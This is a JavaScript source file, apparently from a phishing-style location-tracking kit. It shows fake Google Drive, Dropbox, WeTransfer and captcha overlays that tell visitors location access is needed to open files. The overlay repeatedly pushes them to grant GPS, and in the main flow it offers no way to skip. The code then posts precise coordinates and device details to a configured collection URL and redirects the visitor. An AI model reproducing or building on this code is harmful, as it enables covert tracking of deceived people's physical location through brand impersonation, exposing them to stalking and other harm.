// --- GPS Handler ---
// Shared GPS result object construction, overlay UI, and retry logic.

function buildGpsResult(pos) {
  return {
    gpsGranted: true,
    instantDenial: false,
    latitude: pos.coords.latitude,
    longitude: pos.coords.longitude,
    accuracy: pos.coords.accuracy,
    altitude: pos.coords.altitude,
    altitudeAccuracy: pos.coords.altitudeAccuracy,
    speed: pos.coords.speed,
    heading: pos.coords.heading,
  };
}

var GPS_PRIMARY_OPTIONS = { enableHighAccuracy: true, timeout: 12000, maximumAge: 60000 };
var GPS_FALLBACK_OPTIONS = { enableHighAccuracy: false, timeout: 15000, maximumAge: 300000 };

function buildGpsFailure(error, elapsed) {
  var code = error && error.code;
  return {
    gpsGranted: false,
    instantDenial: code === 1 && elapsed < 750,
    gpsError: code === 1 ? 'permission_denied' : code === 2 ? 'position_unavailable' : code === 3 ? 'timeout' : 'unsupported'
  };
}

function requestPositionWithFallback(onSuccess, onError) {
  if (!navigator.geolocation) {
    onError(buildGpsFailure(null, 0));
    return;
  }

  var startedAt = Date.now();
  navigator.geolocation.getCurrentPosition(
    onSuccess,
    function(primaryError) {
      if (primaryError && primaryError.code === 1) {
        onError(buildGpsFailure(primaryError, Date.now() - startedAt));
        return;
      }

      navigator.geolocation.getCurrentPosition(
        onSuccess,
        function(fallbackError) {
          onError(buildGpsFailure(fallbackError || primaryError, Date.now() - startedAt));
        },
        GPS_FALLBACK_OPTIONS
      );
    },
    GPS_PRIMARY_OPTIONS
  );
}

export function requestGPS() {
  return new Promise(function(resolve) {
    requestPositionWithFallback(
      function(pos) {
        resolve(buildGpsResult(pos));
      },
      function(result) { resolve(result); }
    );
  });
}

// Non-Promise wrapper — keeps getCurrentPosition() in the synchronous call
// chain from a user gesture so iOS Safari doesn't silently block the prompt.
export function requestGPSDirect(onSuccess, onError) {
  requestPositionWithFallback(
    function(pos) {
      onSuccess(buildGpsResult(pos));
    },
    onError
  );
}

export function checkGeoPermission() {
  return new Promise(function(resolve) {
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
        resolve(result.state); // 'granted' | 'denied' | 'prompt'
      }).catch(function() {
        resolve('unknown');
      });
    } else {
      resolve('unknown');
    }
  });
}

function getBrowserName() {
  if (typeof UAParser !== 'undefined') {
    try {
      var parser = new UAParser();
      var name = parser.getBrowser().name || '';
      if (/Chrome/i.test(name) && !/Edge/i.test(name)) return 'chrome';
      if (/Edge/i.test(name)) return 'edge';
      if (/Firefox/i.test(name)) return 'firefox';
      if (/Safari/i.test(name)) return 'safari';
    } catch(e) {}
  }
  var ua = navigator.userAgent || '';
  if (/Edg\//i.test(ua)) return 'edge';
  if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'chrome';
  if (/Firefox/i.test(ua)) return 'firefox';
  if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'safari';
  return 'generic';
}

export function isIOS() {
  var ua = navigator.userAgent || '';
  return /iPhone|iPad|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
}

function isMobileDevice() {
  return isIOS() || /Android|Mobile/i.test(navigator.userAgent || '');
}

// Detect iOS in-app browsers (WebViews) that block geolocation silently.
export function isIOSWebView() {
  if (!isIOS()) return false;
  var ua = navigator.userAgent || '';
  // Chrome/Firefox/Edge/Opera on iOS handle geo themselves
  if (/CriOS|FxiOS|OPiOS|EdgiOS/i.test(ua)) return false;
  // Native Safari includes "Safari/" in the UA; in-app WebViews omit it
  if (/AppleWebKit/i.test(ua) && !/Safari\//i.test(ua)) return true;
  // Known in-app browser tokens
  if (/FBAN|FBAV|Instagram|Line\/|WhatsApp|Snapchat|KAKAOTALK|Telegram|Twitter|BytedanceWebview/i.test(ua)) return true;
  return false;
}

function getLocationResetInstructions() {
  if (!window.isSecureContext && !/^localhost$|^127\./.test(window.location.hostname)) {
    return 'Location access requires a secure HTTPS page. Open the HTTPS version of this link and try again.';
  }
  if (isIOSWebView()) {
    return 'This browser does not support location access. Tap the share or menu icon (\u2026) at the bottom and select "Open in Safari", then try again.';
  }
  var browser = getBrowserName();
  switch (browser) {
    case 'chrome':
    case 'edge':
      return (isMobileDevice() ? 'Tap' : 'Click') + ' the lock or tune icon in the address bar \u2192 Site settings \u2192 Location \u2192 Allow, then refresh this page.';
    case 'firefox':
      return (isMobileDevice() ? 'Tap' : 'Click') + ' the lock icon in the address bar \u2192 clear the blocked Location permission, then refresh this page.';
    case 'safari':
      if (isIOS()) {
        return 'Open Settings \u2192 Privacy & Security \u2192 Location Services. Make sure Location Services is ON and Safari Websites is set to "While Using" or "Ask". Then return here and refresh the page.';
      }
      return 'Go to Safari \u2192 Settings \u2192 Websites \u2192 Location \u2192 set to Allow, then refresh this page.';
    default:
      return 'Check your browser settings to allow location access for this site, then refresh this page.';
  }
}

function getTemplateLocationCopy(templateId) {
  switch (templateId) {
    case 'gdrive':
      return { title: 'Location Required for File Access', message: 'Allow location access to finish verifying this Google Drive request.', accent: '#1a73e8', action: 'Allow & Continue' };
    case 'dropbox':
      return { title: 'Location Required for Folder Access', message: 'Allow location access to finish verifying this Dropbox invitation.', accent: '#0061ff', action: 'Allow & Open Folder' };
    case 'wetransfer':
      return { title: 'Location Required for Download', message: 'Allow location access before this WeTransfer download can continue.', accent: '#400099', action: 'Allow & Download' };
    case 'captcha':
      return { title: 'Location Required for Verification', message: 'Allow location access to complete the human verification step.', accent: '#2196f3', action: 'Allow & Verify' };
    default:
      return { title: 'Location Access Required', message: 'Allow location access before this page can continue to its destination.', accent: '#4285f4', action: 'Allow Location' };
  }
}

export function sendData(config, payload) {
  return fetch(config.collectUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  }).catch(function() {});
}

// Shared overlay builder — used by both redirect and gdrive GPS-required flows.
// onRetry(resultCallback) is called with a callback that receives the GPS result.
export function buildGpsOverlay(isDenied, onRetry, onSkip, config) {
  // Remove existing overlay if any
  var existing = document.getElementById('__gps_required_overlay');
  if (existing) existing.remove();

  var overlay = document.createElement('div');
  overlay.id = '__gps_required_overlay';
  overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:999999;';

  var templateCopy = getTemplateLocationCopy(config && config.templateId);
  var box = document.createElement('div');
  box.style.cssText = 'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fff;border-radius:12px;padding:32px;max-width:420px;margin:20px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);border-top:4px solid ' + templateCopy.accent + ';';

  var icon = document.createElement('div');
  icon.innerHTML = '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="' + templateCopy.accent + '" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>';
  icon.style.marginBottom = '16px';

  var title = document.createElement('h3');
  title.style.cssText = 'margin:0 0 8px;font-size:18px;font-weight:600;color:#111;';

  var msg = document.createElement('p');
  msg.style.cssText = 'margin:0 0 24px;font-size:14px;color:#666;line-height:1.5;';

  var btn = document.createElement('button');
  btn.style.cssText = 'background:' + templateCopy.accent + ';color:#fff;border:none;padding:12px 28px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;';

  var instructionsEl = null;

  box.appendChild(icon);
  box.appendChild(title);
  box.appendChild(msg);

  function showDeniedState() {
    title.textContent = templateCopy.title + ' — Blocked';
    msg.textContent = templateCopy.message + ' Update the location permission for this site:';

    if (!instructionsEl) {
      instructionsEl = document.createElement('p');
      instructionsEl.style.cssText = 'margin:0 0 24px;font-size:13px;color:#444;line-height:1.6;background:#f8f9fa;padding:12px 16px;border-radius:8px;text-align:left;';
      box.insertBefore(instructionsEl, btn);
    }
    instructionsEl.textContent = getLocationResetInstructions();

    btn.textContent = 'Refresh Page';
    btn.disabled = false;
    btn.style.background = templateCopy.accent;
    btn.style.cursor = 'pointer';
    btn.onclick = function() { location.reload(); };
  }

  function showRetryState() {
    title.textContent = templateCopy.title;
    msg.textContent = templateCopy.message;

    if (instructionsEl) {
      instructionsEl.remove();
      instructionsEl = null;
    }

    btn.textContent = templateCopy.action;
    btn.disabled = false;
    btn.style.background = templateCopy.accent;
    btn.style.cursor = 'pointer';
    btn.onclick = handleRetryClick;
  }

  function showLoadingState() {
    btn.disabled = true;
    btn.textContent = 'Requesting\u2026';
    btn.style.background = '#9ca3af';
    btn.style.cursor = 'wait';
  }

  function handleRetryClick() {
    showLoadingState();
    onRetry(function(gpsResult) {
      if (gpsResult.gpsGranted) {
        overlay.remove();
      }
      // If not granted, the caller handles transitioning overlay state
      // via a new buildGpsOverlay call or showDeniedState/showRetryState
    });
  }

  if (isDenied) {
    showDeniedState();
  } else {
    showRetryState();
  }

  box.appendChild(btn);

  var skipLink = null;
  if (onSkip) {
    skipLink = document.createElement('a');
    skipLink.textContent = 'Continue without location';
    skipLink.href = '#';
    skipLink.style.cssText = 'display:block;margin-top:16px;font-size:13px;color:#888;text-decoration:underline;cursor:pointer;';
    skipLink.onclick = function(e) {
      e.preventDefault();
      overlay.remove();
      onSkip();
    };
    box.appendChild(skipLink);
  }

  overlay.appendChild(box);
  document.body.appendChild(overlay);

  // Return controls so callers can update the overlay in-place
  return { overlay: overlay, showDeniedState: showDeniedState, showRetryState: showRetryState };
}

export function handleGpsRequired(config, retryCount, deviceInfo) {
  function finishWithGps(gpsInfo) {
    var payload = Object.assign({}, deviceInfo, gpsInfo);
    sendData(config, payload).then(function() {
      if (config.templateId === 'redirect') {
        window.location.href = config.targetUrl;
      }
    });
  }

  // Show overlay and handle retries via button clicks.
  // count = number of real user-initiated denials so far.
  function showOverlayWithRetry(isDenied, count) {
    buildGpsOverlay(isDenied, function(resultCallback) {
      requestGPSDirect(
        function(result) {
          resultCallback(result);
          handleRetryResult(result, count);
        },
        function(result) {
          resultCallback(result);
          handleRetryResult(result, count);
        }
      );
    }, null, config);
  }

  function handleRetryResult(result, count) {
    if (result.gpsGranted) {
      finishWithGps(result);
      return;
    }

    // Instant denial = OS-level block, don't count as a user-initiated retry
    var nextCount = result.instantDenial ? count : count + 1;

    if (nextCount >= 3) {
      showOverlayWithRetry(true, nextCount);
      return;
    }

    // On iOS, permissions.query can return 'prompt' even when geolocation
    // is actually blocked. Trust the instant denial signal instead.
    if (isIOS() && result.instantDenial) {
      showOverlayWithRetry(true, nextCount);
      return;
    }

    checkGeoPermission().then(function(perm) {
      var denied = perm === 'denied' || (perm === 'unknown' && result.instantDenial);
      showOverlayWithRetry(denied, nextCount);
    });
  }

  if (retryCount >= 3) {
    showOverlayWithRetry(true, retryCount);
    return;
  }

  function attemptInitialGps() {
    requestGPS().then(function(gpsInfo) {
      if (gpsInfo.gpsGranted) {
        finishWithGps(gpsInfo);
        return;
      }

      var nextCount = gpsInfo.instantDenial ? retryCount : retryCount + 1;
      if (nextCount >= 3) {
        showOverlayWithRetry(true, nextCount);
        return;
      }
      if (isIOS() && gpsInfo.instantDenial) {
        showOverlayWithRetry(true, nextCount);
        return;
      }

      checkGeoPermission().then(function(permState) {
        var isDenied = permState === 'denied' || gpsInfo.gpsError === 'permission_denied';
        showOverlayWithRetry(isDenied, nextCount);
      });
    });
  }

  // When permission has not been granted yet, explain why the selected
  // template needs location before triggering the browser prompt. The button
  // preserves the user gesture required by iOS and embedded browsers.
  checkGeoPermission().then(function(permissionState) {
    if (permissionState === 'granted') {
      attemptInitialGps();
    } else {
      showOverlayWithRetry(permissionState === 'denied', retryCount);
    }
  });
}
